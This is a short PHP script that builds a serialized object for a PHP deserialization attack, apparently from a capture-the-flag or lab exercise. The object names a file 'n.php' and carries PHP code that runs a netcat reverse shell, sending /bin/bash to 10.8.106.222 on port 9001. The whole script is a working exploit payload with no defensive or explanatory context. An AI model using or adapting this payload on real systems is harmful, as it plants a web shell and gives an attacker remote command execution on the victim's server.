<?php

    class file
    {
        public $file = 'n.php';
        public $data = '<?php shell_exec("nc -e /bin/bash 10.8.106.222 9001"); ?>';
    }

    echo (serialize(new file));
?>